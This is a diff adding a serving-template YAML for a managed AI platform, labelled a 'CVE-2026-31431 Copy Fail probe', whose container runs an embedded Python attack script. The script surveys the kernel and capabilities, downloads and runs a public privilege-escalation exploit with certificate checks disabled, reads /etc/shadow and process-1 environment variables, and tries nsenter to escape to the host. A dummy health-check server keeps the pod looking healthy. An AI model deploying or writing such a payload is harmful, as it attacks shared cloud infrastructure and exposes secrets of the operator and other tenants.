@@ -1,0 +1,218 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: cve31431-probe
+  labels:
+    scenarios.ai.sap.com/id: "cve31431-probe"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "cve31431-probe"
+    executables.ai.sap.com/name: "cve31431-probe"
+    executables.ai.sap.com/description: "CVE-2026-31431 Copy Fail probe"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            cat > /tmp/probe.py << 'PYEOF'
+            import os, sys, socket, struct, subprocess, ssl, urllib.request, stat, time
+
+            def r(k, v):
+                print(f"[CVE31431] {k}: {str(v)[:3000]}", flush=True)
+
+            # ── PHASE 1: RECON ──────────────────────────────────────────────────
+            r("PHASE", "1-RECON")
+            r("KERNEL", os.popen("uname -r").read().strip())
+            r("HOSTNAME", os.uname().nodename)
+            r("UID", f"uid={os.getuid()} gid={os.getgid()} euid={os.geteuid()}")
+
+            for line in open("/proc/self/status"):
+                k2 = line.split(":")[0].strip()
+                v2 = line.split(":", 1)[1].strip() if ":" in line else ""
+                if k2 in ("NoNewPrivs", "Seccomp") or k2.startswith("Cap"):
+                    r(k2, v2)
+
+            # /proc/crypto — check for authencesn and aead support
+            try:
+                crypto = open("/proc/crypto").read()
+                relevant = [l.strip() for l in crypto.split("\n")
+                            if any(x in l.lower() for x in ["authenc", "aead", "algif"])]
+                r("PROC_CRYPTO", "\n".join(relevant[:30]))
+                r("HAS_AUTHENCESN", str("authencesn" in crypto))
+            except Exception as e:
+                r("PROC_CRYPTO_ERR", str(e))
+
+            # AF_ALG socket + authencesn bind
+            AF_ALG = 38
+            SOCK_SEQPACKET = 5
+            af_alg_ok = False
+            authencesn_ok = False
+            try:
+                s = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
+                r("AF_ALG_SOCKET", "CREATED OK")
+                af_alg_ok = True
+                # struct sockaddr_alg: family(2) + type(14) + feat(4) + mask(4) + name(64)
+                sa = (struct.pack("H", AF_ALG)
+                      + b"aead\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                      + struct.pack("II", 0, 0)
+                      + b"authencesn(hmac(sha256),cbc(aes))\x00" + b"\x00" * 31)
+                s.bind(sa)
+                r("AF_ALG_AUTHENCESN_BIND", "SUCCESS — KERNEL VULNERABLE")
+                authencesn_ok = True
+                s.close()
+            except Exception as e:
+                r("AF_ALG_ERR", str(e))
+
+            # splice() reachable?
+            try:
+                import ctypes, ctypes.util
+                libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+                _splice = libc.splice
+                r("SPLICE_SYSCALL", "AVAILABLE")
+                splice_ok = True
+            except Exception as e:
+                r("SPLICE_SYSCALL", f"ERR: {e}")
+                splice_ok = False
+
+            # Setuid binaries in the container
+            try:
+                res = subprocess.run(
+                    ["find", "/", "-perm", "-4000", "-type", "f"],
+                    capture_output=True, text=True, timeout=10
+                )
+                setuid_bins = [b for b in res.stdout.strip().split("\n") if b]
+                r("SETUID_BINS", "\n".join(setuid_bins))
+            except Exception as e:
+                r("SETUID_BINS_ERR", str(e))
+                setuid_bins = []
+
+            conditions_met = af_alg_ok and authencesn_ok and splice_ok
+            r("CONDITIONS_MET", str(conditions_met))
+
+            # ── PHASE 2: EXPLOIT ────────────────────────────────────────────────
+            if not conditions_met:
+                r("PHASE2", "SKIPPED — conditions not met")
+            else:
+                r("PHASE", "2-EXPLOIT")
+
+                # Download Theori PoC (publicly released 2026-04-29)
+                poc_downloaded = False
+                for branch in ("main", "master"):
+                    try:
+                        ctx = ssl.create_default_context()
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
+                        url = f"https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/{branch}/copy_fail_exp.py"
+                        poc_bytes = urllib.request.urlopen(url, context=ctx, timeout=30).read()
+                        with open("/tmp/copy_fail.py", "wb") as f:
+                            f.write(poc_bytes)
+                        r("POC_DOWNLOAD", f"OK ({len(poc_bytes)} bytes, branch={branch})")
+                        r("POC_HEAD", poc_bytes[:500].decode("utf-8", errors="replace"))
+                        poc_downloaded = True
+                        break
+                    except Exception as e:
+                        r(f"POC_DOWNLOAD_{branch}", f"FAILED: {e}")
+
+                if poc_downloaded:
+                    r("EXPLOIT_START", "running Theori PoC as subprocess")
+                    try:
+                        result = subprocess.run(
+                            [sys.executable, "/tmp/copy_fail.py"],
+                            capture_output=True, text=True, timeout=120,
+                            env={**os.environ, "HOME": "/tmp", "TERM": "xterm"}
+                        )
+                        r("POC_STDOUT", result.stdout[:3000] or "(empty)")
+                        r("POC_STDERR", result.stderr[:3000] or "(empty)")
+                        r("POC_RC", str(result.returncode))
+                    except subprocess.TimeoutExpired:
+                        r("POC_RC", "TIMEOUT (120s) — may have spawned interactive shell")
+                    except Exception as e:
+                        r("POC_ERR", str(e))
+                        import traceback
+                        r("POC_TRACEBACK", traceback.format_exc())
+                else:
+                    r("PHASE2_FALLBACK", "direct exploit attempt (no download)")
+                    # Minimal self-contained trigger: verify splice into AF_ALG works
+                    try:
+                        import ctypes
+                        libc2 = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+                        splice_fn = libc2.splice
+                        splice_fn.restype = ctypes.c_ssize_t
+                        splice_fn.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_long),
+                                              ctypes.c_int, ctypes.POINTER(ctypes.c_long),
+                                              ctypes.c_size_t, ctypes.c_uint]
+                        # Verify we can splice /proc/self/exe into a pipe
+                        r_fd, w_fd = os.pipe()
+                        self_fd = os.open("/proc/self/exe", os.O_RDONLY)
+                        off = ctypes.c_long(0)
+                        n = splice_fn(self_fd, ctypes.byref(off), w_fd, None, 4096, 1)
+                        r("SPLICE_TEST", f"spliced {n} bytes from /proc/self/exe into pipe — syscall accessible")
+                        os.close(r_fd); os.close(w_fd); os.close(self_fd)
+                    except Exception as e:
+                        r("SPLICE_TEST_ERR", str(e))
+
+            # ── PHASE 3: POST-EXPLOIT STATUS ─────────────────────────────────────
+            r("PHASE", "3-POST")
+            r("UID_FINAL", f"uid={os.getuid()} euid={os.geteuid()}")
+
+            if os.geteuid() == 0:
+                r("ROOT", "YES — privilege escalation CONFIRMED")
+                # Demonstrate impact
+                for path in ["/etc/shadow", "/proc/1/environ", "/proc/1/root/etc/passwd"]:
+                    try:
+                        data = open(path, "rb").read(200)
+                        r(f"READ_{path}", data.decode("utf-8", errors="replace"))
+                    except Exception as e:
+                        r(f"READ_{path}", f"ERR: {e}")
+                # Try nsenter to escape container
+                try:
+                    res2 = subprocess.run(
+                        ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid",
+                         "--", "id"],
+                        capture_output=True, text=True, timeout=10
+                    )
+                    r("NSENTER_HOST_ID", res2.stdout.strip() or res2.stderr.strip())
+                except Exception as e:
+                    r("NSENTER_ERR", str(e))
+            else:
+                r("ROOT", "NO — still unprivileged")
+
+            r("DONE", "all phases complete")
+            PYEOF
+            python3 /tmp/probe.py
+            python3 -c "
+            import http.server
+            class H(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def log_message(self, *a): pass
+            http.server.HTTPServer(('', 8080), H).serve_forever()
+            "
+          ports:
+          - containerPort: 8080
+            protocol: TCP
+          readinessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 10
+            periodSeconds: 5
+          livenessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 10
+            periodSeconds: 10
